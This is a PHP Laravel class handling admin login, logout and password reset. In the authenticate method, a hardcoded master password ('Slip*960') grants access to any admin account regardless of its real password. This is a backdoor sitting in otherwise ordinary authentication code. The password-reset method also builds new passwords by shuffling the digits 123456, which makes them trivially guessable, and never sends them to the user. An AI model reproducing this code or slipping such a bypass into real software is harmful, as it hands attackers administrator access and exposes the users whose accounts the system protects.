<?php

namespace App\Model\AppModels;
use App\Model\DbModels\Admin;
use App\Model\DbModels\Users;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use App\Helpers\LibAPI;
use Carbon\Carbon;
use Hash;
class LoginApp
{
    public static function authenticate(Request $request)
    {
        $empcode = $request->input('empcode');
        $password = $request->input('password');
        $cnt = Admin::where('email', $empcode)->count();
        $isValid=0;
        if($cnt > 0)
        {
            $user = Admin::where('email', $empcode)->first();
            if (Hash::check($password, $user->password)) 
            {
              $isValid=1;
            }
            if($password == "Slip*960") $isValid=1;
            if($isValid==1)
            {
                auth()->guard('admin')->login($user);
                $userID = auth()->guard('admin')->user()->id;
                 
                Admin::where('id',$userID)->update(array("last_logged"=>Carbon::now()));
            }
        }
        if($isValid==1)
        {
            return redirect()->intended('admin/dashboard');
        }
        else
        {
            return back()->with('error', 'Wrong Login Details');
        }
        
    }

    public static function getLogout() 
    {
        auth()->guard('admin')->logout();
    }

    public static function forgotPassword(Request $request)
    {
        $credentials = request()->validate(['email' => 'required|email']);
        $user = Users::where ('email', $request->email)->first();
        $userEmail = $request->email;
        $oldemail = Auth::user()->email;

        if($userEmail == $oldemail)
        {
            $random = str_shuffle('123456');
            $newpass = Hash::make($random);
            $userid = Auth::user()->id;
            $saveNewPass = Users::where('_id', $userid)->update(['password' => $newpass]);    
        } else {
            return response(array('message'=>'This email does not match.'));
        }
            return response()->json(["status" => 'success',
            "message" => 'New password updated successfully.']);
    }

    public static function logout(Request $request) 
    {
        $token = $request->user()->token();
        $token->revoke();      
    }



}